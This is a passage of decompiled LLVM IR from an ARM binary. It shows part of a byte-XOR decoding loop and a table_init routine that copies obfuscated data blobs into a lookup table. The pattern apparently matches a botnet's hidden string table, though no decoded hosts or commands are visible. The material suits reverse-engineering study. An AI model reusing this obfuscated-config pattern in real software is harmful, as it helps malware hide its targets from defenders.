  %v2_10ef0 = load i32, i32* %arg1, align 4
  %v0_10ef4 = load i32, i32* %ip.global-to-local, align 4
  %v2_10ef4 = add i32 %v0_10ef4, %v2_10ef0
  %v3_10ef4 = inttoptr i32 %v2_10ef4 to i8*
  %v4_10ef4 = load i8, i8* %v3_10ef4, align 1
  %v6_10ef4 = zext i8 %v4_10ef4 to i32
  %v0_10ef8 = load i32, i32* %r4.global-to-local, align 4
  %v2_10ef8 = xor i32 %v0_10ef8, %v6_10ef4
  %v1_10efc = trunc i32 %v2_10ef8 to i8
  store i8 %v1_10efc, i8* %v3_10ef4, align 1
  %v3_10f00 = load i16, i16* %v2_10f00, align 2
  %v4_10f00 = zext i16 %v3_10f00 to i32
  %v0_10f04 = load i32, i32* %ip.global-to-local, align 4
  %v1_10f04 = add i32 %v0_10f04, 1
  store i32 %v1_10f04, i32* %ip.global-to-local, align 4
  %v8_10f0c = icmp sgt i32 %v4_10f00, %v1_10f04
  br i1 %v8_10f0c, label %dec_label_pc_10ec0.dec_label_pc_10ec0_crit_edge, label %dec_label_pc_10f10.loopexit

dec_label_pc_10ec0.dec_label_pc_10ec0_crit_edge:  ; preds = %dec_label_pc_10ec0
  %v0_10ec8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10ec0

dec_label_pc_10f10.loopexit:                      ; preds = %dec_label_pc_10ec0
  %v2_10f10.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10f10

dec_label_pc_10f10:                               ; preds = %dec_label_pc_10f10.loopexit, %dec_label_pc_10ea4
  %v2_10f10 = phi i32 [ %v2_10f10.pre, %dec_label_pc_10f10.loopexit ], [ %v3_10ea4, %dec_label_pc_10ea4 ]
  store i32 %v2_10f10, i32* %r4.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_10f04, { 1, 2, 0 }
  uselistorder i32 %v1_10eb4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10f20 = load i32, i32* @r4, align 4
  %v6_10f20 = load i32, i32* @r5, align 4
  %v9_10f20 = load i32, i32* @r6, align 4
  %v12_10f20 = load i32, i32* @r7, align 4
  %v15_10f20 = load i32, i32* @r8, align 4
  %v21_10f20 = load i32, i32* @sl, align 4
  %v24_10f20 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_10f2c = call i32 @malloc()
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_260e0.274 to i32), i32* @r4, align 4
  store i32 %v0_10f2c, i32* @r6, align 4
  %v3_10f44 = call i32 @util_memcpy(i32 %v0_10f2c, i32 ptrtoint (i32* @global_var_1a8dc.282 to i32), i32 2)
  %v0_10f48 = load i32, i32* @r5, align 4
  store i32 %v0_10f48, i32* @r0, align 4
  %v0_10f4c = load i32, i32* @r6, align 4
  store i32 %v0_10f4c, i32* @global_var_260f0.283, align 4
  %v1_10f50 = trunc i32 %v0_10f48 to i16
  store i16 %v1_10f50, i16* bitcast (i32* @global_var_260f4.284 to i16*), align 4
  %v0_10f54 = call i32 @malloc()
  %v0_10f58 = load i32, i32* @r5, align 4
  store i32 %v0_10f54, i32* @r6, align 4
  %v3_10f64 = call i32 @util_memcpy(i32 %v0_10f54, i32 ptrtoint (i32* @global_var_1a8e0.286 to i32), i32 %v0_10f58)
  store i32 29, i32* @r0, align 4
  %v0_10f6c = load i32, i32* @r6, align 4
  store i32 %v0_10f6c, i32* @global_var_26100.287, align 4
  %v0_10f70 = load i32, i32* @r5, align 4
  %v1_10f70 = trunc i32 %v0_10f70 to i16
  store i16 %v1_10f70, i16* bitcast (i32* @global_var_26104.288 to i16*), align 4
  %v0_10f74 = call i32 @malloc()
  store i32 %v0_10f74, i32* @r5, align 4
  %v3_10f84 = call i32 @util_memcpy(i32 %v0_10f74, i32 ptrtoint (i32* @global_var_1a8e4.290 to i32), i32 29)
  store i32 7, i32* @r0, align 4
  %v0_10f90 = load i32, i32* @r5, align 4
  store i32 %v0_10f90, i32* @global_var_26108.291, align 4
  store i16 29, i16* bitcast (i32* @global_var_2610c.292 to i16*), align 4
  %v0_10f98 = call i32 @malloc()
  store i32 7, i32* @r6, align 4
  store i32 %v0_10f98, i32* @r5, align 4
  %v3_10fac = call i32 @util_memcpy(i32 %v0_10f98, i32 ptrtoint (i32* @global_var_1a904.294 to i32), i32 7)
  store i32 5, i32* @r0, align 4
  %v0_10fb4 = load i32, i32* @r5, align 4
  store i32 %v0_10fb4, i32* @global_var_26110.295, align 4
  %v0_10fb8 = load i32, i32* @r6, align 4
  %v1_10fb8 = trunc i32 %v0_10fb8 to i16
  store i16 %v1_10fb8, i16* bitcast (i32* @global_var_26114.296 to i16*), align 4
  %v0_10fbc = call i32 @malloc()
  store i32 %v0_10fbc, i32* @r5, align 4
  %v3_10fcc = call i32 @util_memcpy(i32 %v0_10fbc, i32 ptrtoint (i32* @global_var_1a90c.298 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_2611c.299 to i16*), align 4
  %v0_10fdc = load i32, i32* @r5, align 4
  store i32 %v0_10fdc, i32* @global_var_26118.300, align 4
  %v0_10fe0 = call i32 @malloc()
  store i32 %v0_10fe0, i32* @r5, align 4
  %v3_10ff0 = call i32 @util_memcpy(i32 %v0_10fe0, i32 ptrtoint (i32* @global_var_1a914.302 to i32), i32 4)
  store i32 14, i32* @r0, align 4
  %v0_10ffc = load i32, i32* @r5, align 4
  store i32 %v0_10ffc, i32* @global_var_26120.303, align 4
  store i16 4, i16* bitcast (i32* @global_var_26124.304 to i16*), align 4
  %v0_11004 = call i32 @malloc()
  store i32 %v0_11004, i32* @r5, align 4
  %v3_11014 = call i32 @util_memcpy(i32 %v0_11004, i32 ptrtoint (i32* @global_var_1a91c.306 to i32), i32 14)
  store i32 6, i32* @r0, align 4
  store i16 14, i16* bitcast (i32* @global_var_2612c.307 to i16*), align 4
  %v0_11024 = load i32, i32* @r5, align 4
  store i32 %v0_11024, i32* @global_var_26128.308, align 4
  %v0_11028 = call i32 @malloc()
  store i32 6, i32* @r7, align 4
  store i32 %v0_11028, i32* @r5, align 4
  %v3_1103c = call i32 @util_memcpy(i32 %v0_11028, i32 ptrtoint (i32* @global_var_1a92c.310 to i32), i32 6)
  store i32 8, i32* @r0, align 4
  %v0_11044 = load i32, i32* @r5, align 4
  store i32 %v0_11044, i32* @global_var_26130.311, align 4
  %v0_11048 = load i32, i32* @r7, align 4
  %v1_11048 = trunc i32 %v0_11048 to i16
  store i16 %v1_11048, i16* bitcast (i32* @global_var_26134.312 to i16*), align 4
  %v0_1104c = call i32 @malloc()
  store i32 8, i32* @sl, align 4
  store i32 %v0_1104c, i32* @r5, align 4
  %v3_11060 = call i32 @util_memcpy(i32 %v0_1104c, i32 ptrtoint (i32* @global_var_1a934.314 to i32), i32 8)
  %v0_11064 = load i32, i32* @r6, align 4
  store i32 %v0_11064, i32* @r0, align 4
  %v0_11068 = load i32, i32* @r5, align 4
  store i32 %v0_11068, i32* @global_var_26138.315, align 4
  %v0_1106c = load i32, i32* @sl, align 4
  %v1_1106c = trunc i32 %v0_1106c to i16
  store i16 %v1_1106c, i16* bitcast (i32* @global_var_2613c.316 to i16*), align 4
  %v0_11070 = call i32 @malloc()
  %v0_11074 = load i32, i32* @r6, align 4
  store i32 %v0_11070, i32* @r5, align 4
  %v3_11080 = call i32 @util_memcpy(i32 %v0_11070, i32 ptrtoint (i32* @global_var_1a940.318 to i32), i32 %v0_11074)
  store i32 16, i32* @r0, align 4
  %v0_11088 = load i32, i32* @r5, align 4
  store i32 %v0_11088, i32* @global_var_26140.319, align 4
  %v0_1108c = load i32, i32* @r6, align 4
  %v1_1108c = trunc i32 %v0_1108c to i16
  store i16 %v1_1108c, i16* bitcast (i32* @global_var_26144.320 to i16*), align 4
  %v0_11090 = call i32 @malloc()
  store i32 %v0_11090, i32* @r5, align 4
  %v3_110a0 = call i32 @util_memcpy(i32 %v0_11090, i32 ptrtoint (i32* @global_var_1a948.322 to i32), i32 16)
  store i32 14, i32* @r0, align 4
  %v0_110ac = load i32, i32* @r5, align 4
  store i32 %v0_110ac, i32* @global_var_26148.323, align 4
  store i16 16, i16* bitcast (i32* @global_var_2614c.324 to i16*), align 4
  %v0_110b4 = call i32 @malloc()
  store i32 %v0_110b4, i32* @r5, align 4
  %v3_110c4 = call i32 @util_memcpy(i32 %v0_110b4, i32 ptrtoint (i32* @global_var_1a95c.326 to i32), i32 14)
  store i32 9, i32* @r0, align 4
  store i16 14, i16* bitcast (i32* @global_var_26154.327 to i16*), align 4
  %v0_110d4 = load i32, i32* @r5, align 4
  store i32 %v0_110d4, i32* @global_var_26150.328, align 4
  %v0_110d8 = call i32 @malloc()
  store i32 9, i32* @sb, align 4
  store i32 %v0_110d8, i32* @r5, align 4
  %v3_110ec = call i32 @util_memcpy(i32 %v0_110d8, i32 ptrtoint (i32* @global_var_1a96c.330 to i32), i32 9)
  store i32 19, i32* @r0, align 4
  %v0_110f4 = load i32, i32* @r5, align 4
  store i32 %v0_110f4, i32* @global_var_26158.331, align 4
  %v0_110f8 = load i32, i32* @sb, align 4
  %v1_110f8 = trunc i32 %v0_110f8 to i16
  store i16 %v1_110f8, i16* bitcast (i32* @global_var_2615c.332 to i16*), align 4
  %v0_110fc = call i32 @malloc()
  store i32 19, i32* @fp, align 4
  store i32 %v0_110fc, i32* @r5, align 4
  %v3_11110 = call i32 @util_memcpy(i32 %v0_110fc, i32 ptrtoint (i32* @global_var_1a978.334 to i32), i32 19)
  store i32 23, i32* @r0, align 4
  %v0_11118 = load i32, i32* @r5, align 4
  store i32 %v0_11118, i32* @global_var_26160.335, align 4
  %v0_1111c = load i32, i32* @fp, align 4
  %v1_1111c = trunc i32 %v0_1111c to i16
  store i16 %v1_1111c, i16* bitcast (i32* @global_var_26164.336 to i16*), align 4
  %v0_11120 = call i32 @malloc()
  store i32 23, i32* @r8, align 4
  store i32 %v0_11120, i32* @r5, align 4
  %v3_11134 = call i32 @util_memcpy(i32 %v0_11120, i32 ptrtoint (i32* @global_var_1a98c.338 to i32), i32 23)
  %v0_11138 = load i32, i32* @sl, align 4
  store i32 %v0_11138, i32* @r0, align 4
  %v0_1113c = load i32, i32* @r5, align 4
  store i32 %v0_1113c, i32* @global_var_26168.339, align 4
  %v0_11140 = load i32, i32* @r8, align 4
  %v1_11140 = trunc i32 %v0_11140 to i16
  store i16 %v1_11140, i16* bitcast (i32* @global_var_2616c.340 to i16*), align 4
  %v0_11144 = call i32 @malloc()
  %v0_1114c = load i32, i32* @sl, align 4
  store i32 %v0_11144, i32* @r5, align 4
  %v4_11154 = call i32 @util_memcpy(i32 %v0_11144, i32 ptrtoint ([9 x i8]* @global_var_1a9a4.342 to i32), i32 %v0_1114c)
  store i32 14, i32* @r0, align 4
  %v0_1115c = load i32, i32* @r5, align 4
  store i32 %v0_1115c, i32* @global_var_26170.343, align 4
  %v0_11160 = load i32, i32* @sl, align 4
  %v1_11160 = trunc i32 %v0_11160 to i16
  store i16 %v1_11160, i16* bitcast (i32* @global_var_26174.344 to i16*), align 4
  %v0_11164 = call i32 @malloc()
  store i32 %v0_11164, i32* @r5, align 4
  %v3_11174 = call i32 @util_memcpy(i32 %v0_11164, i32 ptrtoint (i32* @global_var_1a9b0.346 to i32), i32 14)
  %v0_1117c = load i32, i32* @fp, align 4
  store i32 %v0_1117c, i32* @r0, align 4
  %v0_11180 = load i32, i32* @r5, align 4
  store i32 %v0_11180, i32* @global_var_26178.347, align 4
  store i16 14, i16* bitcast (i32* @global_var_2617c.348 to i16*), align 4
  %v0_11188 = call i32 @malloc()
  %v0_11190 = load i32, i32* @fp, align 4
  store i32 %v0_11188, i32* @r5, align 4
  %v3_11198 = call i32 @util_memcpy(i32 %v0_11188, i32 ptrtoint (i32* @global_var_1a9c0.350 to i32), i32 %v0_11190)
  %v0_1119c = load i32, i32* @r8, align 4
  store i32 %v0_1119c, i32* @r0, align 4
  %v0_111a0 = load i32, i32* @r5, align 4
  store i32 %v0_111a0, i32* @global_var_26180.351, align 4
  %v0_111a4 = load i32, i32* @fp, align 4
  %v1_111a4 = trunc i32 %v0_111a4 to i16
  store i16 %v1_111a4, i16* bitcast (i32* @global_var_26184.352 to i16*), align 4
  %v0_111a8 = call i32 @malloc()
  %v0_111b0 = load i32, i32* @r8, align 4
  store i32 %v0_111a8, i32* @r5, align 4
  %v3_111b8 = call i32 @util_memcpy(i32 %v0_111a8, i32 ptrtoint (i32* @global_var_1a9d4.354 to i32), i32 %v0_111b0)
  store i32 24, i32* @r0, align 4
  %v0_111c0 = load i32, i32* @r5, align 4
  store i32 %v0_111c0, i32* @global_var_26188.355, align 4
  %v0_111c4 = load i32, i32* @r8, align 4
  %v1_111c4 = trunc i32 %v0_111c4 to i16
  store i16 %v1_111c4, i16* bitcast (i32* @global_var_2618c.356 to i16*), align 4
  %v0_111c8 = call i32 @malloc()
  store i32 %v0_111c8, i32* @r5, align 4
  %v3_111d8 = call i32 @util_memcpy(i32 %v0_111c8, i32 ptrtoint (i32* @global_var_1a9ec.358 to i32), i32 24)
  store i32 15, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_26194.359 to i16*), align 4
  %v0_111e8 = load i32, i32* @r5, align 4
  store i32 %v0_111e8, i32* @global_var_26190.360, align 4
  %v0_111ec = call i32 @malloc()
  store i32 %v0_111ec, i32* @r5, align 4
  %v3_111fc = call i32 @util_memcpy(i32 %v0_111ec, i32 ptrtoint (i32* @global_var_1aa08.362 to i32), i32 15)
  %v0_11204 = load i32, i32* @r7, align 4
  store i32 %v0_11204, i32* @r0, align 4
  %v0_11208 = load i32, i32* @r5, align 4
  store i32 %v0_11208, i32* @global_var_26198.363, align 4
  store i16 15, i16* bitcast (i32* @global_var_2619c.364 to i16*), align 4
  %v0_11210 = call i32 @malloc()
  %v0_11214 = load i32, i32* @r7, align 4
  store i32 %v0_11210, i32* @r5, align 4
  %v4_11220 = call i32 @util_memcpy(i32 %v0_11210, i32 ptrtoint ([7 x i8]* @global_var_1aa18.366 to i32), i32 %v0_11214)
  %v0_11224 = load i32, i32* @r6, align 4
  store i32 %v0_11224, i32* @r0, align 4
  %v0_11228 = load i32, i32* @r5, align 4
  store i32 %v0_11228, i32* @global_var_261a0.367, align 4
  %v0_1122c = load i32, i32* @r7, align 4
  %v1_1122c = trunc i32 %v0_1122c to i16
  store i16 %v1_1122c, i16* bitcast (i32* @global_var_261a4.368 to i16*), align 4
  %v0_11230 = call i32 @malloc()
  %v0_11234 = load i32, i32* @r6, align 4
  store i32 %v0_11230, i32* @r5, align 4
  %v4_11240 = call i32 @util_memcpy(i32 %v0_11230, i32 ptrtoint ([8 x i8]* @global_var_1aa20.370 to i32), i32 %v0_11234)
  %v0_11244 = load i32, i32* @r6, align 4
  store i32 %v0_11244, i32* @r0, align 4
  %v0_11248 = load i32, i32* @r5, align 4
  store i32 %v0_11248, i32* @global_var_261a8.371, align 4
  %v1_1124c = trunc i32 %v0_11244 to i16
  store i16 %v1_1124c, i16* bitcast (i32* @global_var_261ac.372 to i16*), align 4
  %v0_11250 = call i32 @malloc()
  %v0_11254 = load i32, i32* @r6, align 4
  store i32 %v0_11250, i32* @r5, align 4
  %v4_11260 = call i32 @util_memcpy(i32 %v0_11250, i32 ptrtoint ([8 x i8]* @global_var_1aa28.374 to i32), i32 %v0_11254)
  store i32 3, i32* @r0, align 4
  %v0_11268 = load i32, i32* @r5, align 4
  store i32 %v0_11268, i32* @global_var_261b0.375, align 4
  %v0_1126c = load i32, i32* @r6, align 4
  %v1_1126c = trunc i32 %v0_1126c to i16
  store i16 %v1_1126c, i16* bitcast (i32* @global_var_261b4.376 to i16*), align 4
  %v0_11270 = call i32 @malloc()
  store i32 %v0_11270, i32* @r5, align 4
  %v4_11280 = call i32 @util_memcpy(i32 %v0_11270, i32 ptrtoint ([4 x i8]* @global_var_1aa30.378 to i32), i32 3)
  %v0_11288 = load i32, i32* @r8, align 4
  store i32 %v0_11288, i32* @r0, align 4
  store i16 3, i16* bitcast (i32* @global_var_261bc.379 to i16*), align 4
  %v0_11290 = load i32, i32* @r5, align 4
  store i32 %v0_11290, i32* @global_var_261b8.380, align 4
  %v0_11294 = call i32 @malloc()
  %v0_1129c = load i32, i32* @r8, align 4
  store i32 %v0_11294, i32* @r5, align 4
  %v3_112a4 = call i32 @util_memcpy(i32 %v0_11294, i32 ptrtoint (i32* @global_var_1aa34.382 to i32), i32 %v0_1129c)
  store i32 28, i32* @r0, align 4
  %v0_112ac = load i32, i32* @r5, align 4
  store i32 %v0_112ac, i32* @global_var_261c0.383, align 4
  %v0_112b0 = load i32, i32* @r8, align 4
  %v1_112b0 = trunc i32 %v0_112b0 to i16
  store i16 %v1_112b0, i16* bitcast (i32* @global_var_261c4.384 to i16*), align 4
  %v0_112b4 = call i32 @malloc()
  store i32 %v0_112b4, i32* @r5, align 4
  %v3_112c4 = call i32 @util_memcpy(i32 %v0_112b4, i32 ptrtoint (i32* @global_var_1aa4c.386 to i32), i32 28)
  %v0_112cc = load i32, i32* @sb, align 4
  store i32 %v0_112cc, i32* @r0, align 4
  %v0_112d0 = load i32, i32* @r5, align 4
  store i32 %v0_112d0, i32* @global_var_261c8.387, align 4
  store i16 28, i16* bitcast (i32* @global_var_261cc.388 to i16*), align 4
  %v0_112d8 = call i32 @malloc()
  %v0_112dc = load i32, i32* @sb, align 4
  store i32 %v0_112d8, i32* @r5, align 4
  %v4_112e8 = call i32 @util_memcpy(i32 %v0_112d8, i32 ptrtoint ([10 x i8]* @global_var_1aa6c.390 to i32), i32 %v0_112dc)
  %v0_112ec = load i32, i32* @sl, align 4
  store i32 %v0_112ec, i32* @r0, align 4
  %v0_112f0 = load i32, i32* @r5, align 4
  store i32 %v0_112f0, i32* @global_var_261d0.391, align 4
  %v0_112f4 = load i32, i32* @sb, align 4
  %v1_112f4 = trunc i32 %v0_112f4 to i16
  store i16 %v1_112f4, i16* bitcast (i32* @global_var_261d4.392 to i16*), align 4
  %v0_112f8 = call i32 @malloc()
  %v0_11300 = load i32, i32* @sl, align 4
  store i32 %v0_112f8, i32* @r5, align 4
  %v4_11308 = call i32 @util_memcpy(i32 %v0_112f8, i32 ptrtoint ([9 x i8]* @global_var_1a9a4.342 to i32), i32 %v0_11300)
  store i32 5, i32* @r0, align 4
  %v0_11310 = load i32, i32* @r5, align 4
  store i32 %v0_11310, i32* @global_var_261d8.393, align 4
  %v0_11314 = load i32, i32* @sl, align 4
  %v1_11314 = trunc i32 %v0_11314 to i16
  store i16 %v1_11314, i16* bitcast (i32* @global_var_261dc.394 to i16*), align 4
  %v0_11318 = call i32 @malloc()
  store i32 %v0_11318, i32* @r5, align 4
  %v4_11328 = call i32 @util_memcpy(i32 %v0_11318, i32 ptrtoint ([6 x i8]* @global_var_1aa78.396 to i32), i32 5)
  %v0_11334 = load i32, i32* @r7, align 4
  store i32 %v0_11334, i32* @r0, align 4
  %v2_11338 = load i32, i32* @r4, align 4
  %v4_11338 = add i32 %v2_11338, 260
  %v5_11338 = inttoptr i32 %v4_11338 to i16*
  store i16 5, i16* %v5_11338, align 2
  %v0_1133c = load i32, i32* @r5, align 4
  store i32 %v0_1133c, i32* @global_var_261e0.397, align 4
  %v0_11340 = call i32 @malloc()
  %v0_11344 = load i32, i32* @r7, align 4
  store i32 %v0_11340, i32* @r5, align 4
  %v4_11350 = call i32 @util_memcpy(i32 %v0_11340, i32 ptrtoint ([7 x i8]* @global_var_1aa80.399 to i32), i32 %v0_11344)
  store i32 16, i32* @r0, align 4
  %v0_1135c = load i32, i32* @r7, align 4
  %v1_1135c = trunc i32 %v0_1135c to i16
  %v2_1135c = load i32, i32* @r4, align 4
  %v4_1135c = add i32 %v2_1135c, 268
  %v5_1135c = inttoptr i32 %v4_1135c to i16*
  store i16 %v1_1135c, i16* %v5_1135c, align 2
  %v0_11360 = load i32, i32* @r5, align 4
  store i32 %v0_11360, i32* @global_var_261e8.400, align 4
  %v0_11364 = call i32 @malloc()
  store i32 %v0_11364, i32* %r5.global-to-local, align 4
  %v3_11374 = call i32 @util_memcpy(i32 %v0_11364, i32 ptrtoint (i32* @global_var_1aa88.402 to i32), i32 16)
  store i32 21, i32* @r0, align 4
  %v2_11384 = load i32, i32* @r4, align 4
  %v4_11384 = add i32 %v2_11384, 276
  %v5_11384 = inttoptr i32 %v4_11384 to i16*
  store i16 16, i16* %v5_11384, align 2
  %v0_11388 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11388, i32* @global_var_261f0.403, align 4
  %v0_1138c = load i32, i32* @r0, align 4
  store i32 %v0_1138c, i32* @r5, align 4
  %v0_11390 = call i32 @malloc()
  %v0_11394 = load i32, i32* @r5, align 4
  store i32 %v0_11390, i32* @r6, align 4
  %v3_113a0 = call i32 @util_memcpy(i32 %v0_11390, i32 ptrtoint (i32* @global_var_1aa9c.405 to i32), i32 %v0_11394)
  %v0_113a8 = load i32, i32* @r5, align 4
  store i32 %v0_113a8, i32* @r0, align 4
  %v1_113ac = trunc i32 %v0_113a8 to i16
  %v2_113ac = load i32, i32* @r4, align 4
  %v4_113ac = add i32 %v2_113ac, 284
  %v5_113ac = inttoptr i32 %v4_113ac to i16*
  store i16 %v1_113ac, i16* %v5_113ac, align 2
  %v0_113b0 = load i32, i32* @r6, align 4
  store i32 %v0_113b0, i32* @global_var_261f8.406, align 4
  %v0_113b4 = call i32 @malloc()
  %v0_113b8 = load i32, i32* @r5, align 4
  store i32 %v0_113b4, i32* @r6, align 4
  %v3_113c4 = call i32 @util_memcpy(i32 %v0_113b4, i32 ptrtoint (i32* @global_var_1aab4.408 to i32), i32 %v0_113b8)
  store i32 17, i32* @r0, align 4
  %v0_113d0 = load i32, i32* @r5, align 4
  %v1_113d0 = trunc i32 %v0_113d0 to i16
  %v2_113d0 = load i32, i32* @r4, align 4
  %v4_113d0 = add i32 %v2_113d0, 292
  %v5_113d0 = inttoptr i32 %v4_113d0 to i16*
  store i16 %v1_113d0, i16* %v5_113d0, align 2
  %v0_113d4 = load i32, i32* @r6, align 4
  store i32 %v0_113d4, i32* @global_var_26200.409, align 4
  %v0_113d8 = call i32 @malloc()
  store i32 %v0_113d8, i32* @r5, align 4
  %v3_113e8 = call i32 @util_memcpy(i32 %v0_113d8, i32 ptrtoint (i32* @global_var_1aacc.411 to i32), i32 17)
  store i32 11, i32* @r0, align 4
  %v2_113f8 = load i32, i32* @r4, align 4
  %v4_113f8 = add i32 %v2_113f8, 300
  %v5_113f8 = inttoptr i32 %v4_113f8 to i16*
  store i16 17, i16* %v5_113f8, align 2
  %v0_113fc = load i32, i32* @r5, align 4
  store i32 %v0_113fc, i32* @global_var_26208.412, align 4
  %v0_11400 = call i32 @malloc()
  store i32 %v0_11400, i32* @r5, align 4
  %v0_11410 = load i32, i32* @r7, align 4
  %v1_11410 = add i32 %v0_11410, 5
  store i32 %v1_11410, i32* @r7, align 4
  %v4_11414 = call i32 @util_memcpy(i32 %v0_11400, i32 ptrtoint ([12 x i8]* @global_var_1aae0.414 to i32), i32 11)
  %v0_1141c = load i32, i32* @r8, align 4
  store i32 %v0_1141c, i32* @r0, align 4
  %v0_11420 = load i32, i32* @r7, align 4
  %v1_11420 = trunc i32 %v0_11420 to i16
  %v2_11420 = load i32, i32* @r4, align 4
  %v4_11420 = add i32 %v2_11420, 308
  %v5_11420 = inttoptr i32 %v4_11420 to i16*
  store i16 %v1_11420, i16* %v5_11420, align 2
  %v0_11424 = load i32, i32* @r5, align 4
  store i32 %v0_11424, i32* @global_var_26210.415, align 4
  %v0_11428 = call i32 @malloc()
  %v0_11430 = load i32, i32* @r8, align 4
  store i32 %v0_11428, i32* @r5, align 4
  %v3_11438 = call i32 @util_memcpy(i32 %v0_11428, i32 ptrtoint (i32* @global_var_1aaec.417 to i32), i32 %v0_11430)
  store i32 83, i32* @r0, align 4
  %v0_11444 = load i32, i32* @r8, align 4
  %v1_11444 = trunc i32 %v0_11444 to i16
  %v2_11444 = load i32, i32* @r4, align 4
  %v4_11444 = add i32 %v2_11444, 316
  %v5_11444 = inttoptr i32 %v4_11444 to i16*
  store i16 %v1_11444, i16* %v5_11444, align 2
  %v0_11448 = load i32, i32* @r5, align 4
  store i32 %v0_11448, i32* @global_var_26218.418, align 4
  %v0_1144c = call i32 @malloc()
  store i32 %v0_1144c, i32* @r5, align 4
  %v3_1145c = call i32 @util_memcpy(i32 %v0_1144c, i32 ptrtoint (i32* @global_var_1ae10.420 to i32), i32 83)
  store i32 32, i32* @r0, align 4
  %v2_1146c = load i32, i32* @r4, align 4
  %v4_1146c = add i32 %v2_1146c, 324
  %v5_1146c = inttoptr i32 %v4_1146c to i16*
  store i16 83, i16* %v5_1146c, align 2
  %v0_11470 = load i32, i32* @r5, align 4
  store i32 %v0_11470, i32* @global_var_26220.421, align 4
  %v0_11474 = call i32 @malloc()
  store i32 %v0_11474, i32* @r5, align 4
  %v3_11484 = call i32 @util_memcpy(i32 %v0_11474, i32 ptrtoint (i32* @global_var_1ae64.423 to i32), i32 32)
  store i32 48, i32* @r0, align 4
  %v2_11494 = load i32, i32* @r4, align 4
  %v4_11494 = add i32 %v2_11494, 332
  %v5_11494 = inttoptr i32 %v4_11494 to i16*
  store i16 32, i16* %v5_11494, align 2
  %v0_11498 = load i32, i32* @r5, align 4
  store i32 %v0_11498, i32* @global_var_26228.424, align 4
  %v0_1149c = call i32 @malloc()
  store i32 %v0_1149c, i32* @r5, align 4
  %v3_114ac = call i32 @util_memcpy(i32 %v0_1149c, i32 ptrtoint (i32* @global_var_1ab04.426 to i32), i32 48)
  store i32 12, i32* @r0, align 4
  %v2_114bc = load i32, i32* @r4, align 4
  %v4_114bc = add i32 %v2_114bc, 340
  %v5_114bc = inttoptr i32 %v4_114bc to i16*
  store i16 48, i16* %v5_114bc, align 2
  %v0_114c0 = load i32, i32* @r5, align 4
  store i32 %v0_114c0, i32* @global_var_26230.427, align 4
  %v0_114c4 = call i32 @malloc()
  store i32 12, i32* @r6, align 4
  store i32 %v0_114c4, i32* @r5, align 4
  %v3_114d8 = call i32 @util_memcpy(i32 %v0_114c4, i32 ptrtoint (i32* @global_var_1ab38.429 to i32), i32 12)
  %v0_114e0 = load i32, i32* @sb, align 4
  store i32 %v0_114e0, i32* @r0, align 4
  %v0_114e4 = load i32, i32* @r6, align 4
  %v1_114e4 = trunc i32 %v0_114e4 to i16
  %v2_114e4 = load i32, i32* @r4, align 4
  %v4_114e4 = add i32 %v2_114e4, 348
  %v5_114e4 = inttoptr i32 %v4_114e4 to i16*
  store i16 %v1_114e4, i16* %v5_114e4, align 2
  %v0_114e8 = load i32, i32* @r5, align 4
  store i32 %v0_114e8, i32* @global_var_26238.430, align 4
  %v0_114ec = call i32 @malloc()
  %v0_114f0 = load i32, i32* @sb, align 4
  store i32 %v0_114ec, i32* @r5, align 4
  %v3_114fc = call i32 @util_memcpy(i32 %v0_114ec, i32 ptrtoint (i32* @global_var_1ab48.432 to i32), i32 %v0_114f0)
  store i32 10, i32* @r0, align 4
  %v0_11508 = load i32, i32* @sb, align 4
  %v1_11508 = trunc i32 %v0_11508 to i16
  %v2_11508 = load i32, i32* @r4, align 4
  %v4_11508 = add i32 %v2_11508, 356
  %v5_11508 = inttoptr i32 %v4_11508 to i16*
  store i16 %v1_11508, i16* %v5_11508, align 2
  %v0_1150c = load i32, i32* @r5, align 4
  store i32 %v0_1150c, i32* @global_var_26240.433, align 4
  %v0_11510 = call i32 @malloc()
  store i32 %v0_11510, i32* @r5, align 4
  %v0_11520 = load i32, i32* @sb, align 4
  %v1_11520 = add i32 %v0_11520, 1
  store i32 %v1_11520, i32* @sb, align 4
  %v3_11524 = call i32 @util_memcpy(i32 %v0_11510, i32 ptrtoint (i32* @global_var_1ab54.435 to i32), i32 10)
  %v0_1152c = load i32, i32* @r6, align 4
  store i32 %v0_1152c, i32* @r0, align 4
  %v0_11530 = load i32, i32* @sb, align 4
  %v1_11530 = trunc i32 %v0_11530 to i16
  %v2_11530 = load i32, i32* @r4, align 4
  %v4_11530 = add i32 %v2_11530, 364
  %v5_11530 = inttoptr i32 %v4_11530 to i16*
  store i16 %v1_11530, i16* %v5_11530, align 2
  %v0_11534 = load i32, i32* @r5, align 4
  store i32 %v0_11534, i32* @global_var_26248.436, align 4
  %v0_11538 = call i32 @malloc()
  %v0_1153c = load i32, i32* @r6, align 4
  store i32 %v0_11538, i32* @r5, align 4
  %v3_11548 = call i32 @util_memcpy(i32 %v0_11538, i32 ptrtoint (i32* @global_var_1ab60.438 to i32), i32 %v0_1153c)
  store i32 16, i32* @r0, align 4
  %v0_11554 = load i32, i32* @r6, align 4
  %v1_11554 = trunc i32 %v0_11554 to i16
  %v2_11554 = load i32, i32* @r4, align 4
  %v4_11554 = add i32 %v2_11554, 372
  %v5_11554 = inttoptr i32 %v4_11554 to i16*
  store i16 %v1_11554, i16* %v5_11554, align 2
  %v0_11558 = load i32, i32* @r5, align 4
  store i32 %v0_11558, i32* @global_var_26250.439, align 4
  %v0_1155c = call i32 @malloc()
  store i32 %v0_1155c, i32* @r5, align 4
  %v3_1156c = call i32 @util_memcpy(i32 %v0_1155c, i32 ptrtoint (i32* @global_var_1ab70.441 to i32), i32 16)
  %v0_11578 = load i32, i32* @fp, align 4
  store i32 %v0_11578, i32* @r0, align 4
  %v2_1157c = load i32, i32* @r4, align 4
  %v4_1157c = add i32 %v2_1157c, 380
